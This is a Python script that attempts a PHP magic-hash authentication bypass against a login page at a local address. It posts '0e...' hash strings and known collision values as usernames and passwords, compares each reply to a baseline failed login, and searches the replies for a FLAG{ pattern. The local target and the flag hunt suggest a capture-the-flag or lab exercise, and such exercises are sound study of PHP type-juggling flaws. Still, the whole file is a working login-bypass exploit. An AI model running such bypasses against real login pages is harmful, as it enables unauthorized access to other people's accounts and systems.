import requests
import urllib.parse

# Target URL
target_url = "http://127.0.0.1:32829/index.php"

# Magic hashes that evaluate to 0 in PHP loose comparison
magic_hashes = [
    "0e215962017",
    "0e215962017",  # appears twice in the list
    "0e291659679240482754926478512357",
    "0e342768416822451524974117254469",
    "0e730083352386295381453807969534",
    "0e902082747337880403309852904361",
    "0e113712690178732282364510896851",
    "0e659985946963039959674848667895",
    "QNKCDZO",
    "240610708"
]

# First, let's see what a normal failed login looks like
print("[+] Testing baseline failed login response...")
try:
    baseline_response = requests.post(target_url, data={"username": "wrong", "password": "wrong"}, timeout=10)
    print(f"[+] Baseline - Status: {baseline_response.status_code}")
    print(f"[+] Baseline - Content Length: {len(baseline_response.text)} bytes")
    print(f"[+] Baseline - Headers: {dict(baseline_response.headers)}")
    print(f"[+] Baseline - Response content preview: {baseline_response.text[:200]}\n")
except Exception as e:
    print(f"[!] Error getting baseline: {e}\n")

# Test each magic hash combination
successful_combinations = []
print("[+] Testing magic hash combinations...")
print("=" * 80)

for i, magic_hash in enumerate(magic_hashes):
    print(f"\n[+] Testing magic hash {i+1}/{len(magic_hashes)}: {magic_hash}")
    
    # Test as both username and password
    try:
        # Test 1: magic hash as both username and password
        response = requests.post(
            target_url, 
            data={"username": magic_hash, "password": magic_hash},
            timeout=10,
            allow_redirects=False
        )
        
        print(f"  [1] Username={magic_hash}, Password={magic_hash}")
        print(f"      Status: {response.status_code}")
        print(f"      Content Length: {len(response.text)} bytes")
        if response.headers.get('Set-Cookie'):
            print(f"      Set-Cookie: {response.headers.get('Set-Cookie')}")
        if response.status_code == 302:
            print(f"      Redirect Location: {response.headers.get('Location')}")
        
        # Check if response is different from baseline
        if len(response.text) != len(baseline_response.text) or response.status_code != baseline_response.status_code:
            print(f"      [POTENTIAL SUCCESS] Different response detected!")
            successful_combinations.append({
                "username": magic_hash,
                "password": magic_hash,
                "status": response.status_code,
                "length": len(response.text),
                "response": response.text[:500]
            })
        
        # Test 2: magic hash as username, normal password
        response2 = requests.post(
            target_url,
            data={"username": magic_hash, "password": "admin"},
            timeout=10,
            allow_redirects=False
        )
        
        print(f"  [2] Username={magic_hash}, Password=admin")
        print(f"      Status: {response2.status_code}")
        print(f"      Content Length: {len(response2.text)} bytes")
        
        if len(response2.text) != len(baseline_response.text) or response2.status_code != baseline_response.status_code:
            print(f"      [POTENTIAL SUCCESS] Different response detected!")
            successful_combinations.append({
                "username": magic_hash,
                "password": "admin",
                "status": response2.status_code,
                "length": len(response2.text),
                "response": response2.text[:500]
            })
        
        # Test 3: normal username, magic hash as password
        response3 = requests.post(
            target_url,
            data={"username": "admin", "password": magic_hash},
            timeout=10,
            allow_redirects=False
        )
        
        print(f"  [3] Username=admin, Password={magic_hash}")
        print(f"      Status: {response3.status_code}")
        print(f"      Content Length: {len(response3.text)} bytes")
        
        if len(response3.text) != len(baseline_response.text) or response3.status_code != baseline_response.status_code:
            print(f"      [POTENTIAL SUCCESS] Different response detected!")
            successful_combinations.append({
                "username": "admin",
                "password": magic_hash,
                "status": response3.status_code,
                "length": len(response3.text),
                "response": response3.text[:500]
            })
            
    except Exception as e:
        print(f"  [!] Error testing {magic_hash}: {e}")

print("\n" + "=" * 80)
print("\n[+] SUMMARY")
print("=" * 80)

if successful_combinations:
    print(f"\n[+] FOUND {len(successful_combinations)} POTENTIALLY SUCCESSFUL COMBINATIONS:")
    for idx, combo in enumerate(successful_combinations, 1):
        print(f"\n[{idx}] Username: {combo['username']}")
        print(f"    Password: {combo['password']}")
        print(f"    Status: {combo['status']}")
        print(f"    Response Length: {combo['length']} bytes")
        print(f"    Response Preview: {combo['response'][:200]}...")
        
        # Check for flag patterns
        if "FLAG{" in combo['response']:
            print(f"    [!] FLAG FOUND IN RESPONSE!")
            flag_start = combo['response'].find("FLAG{")
            flag_end = combo['response'].find("}", flag_start) + 1
            flag = combo['response'][flag_start:flag_end]
            print(f"    [!] FLAG: {flag}")
else:
    print("\n[-] No successful magic hash bypass combinations found.")

# Check if any response contains authentication indicators
print("\n[+] Checking for authentication indicators in all tested responses...")
indicators = ["welcome", "dashboard", "logged in", "logout", "session", "admin", "success"]
for combo in successful_combinations:
    response_lower = combo['response'].lower()
    found_indicators = [ind for ind in indicators if ind in response_lower]
    if found_indicators:
        print(f"  Found indicators {found_indicators} in response for combo: {combo['username']}/{combo['password']}")
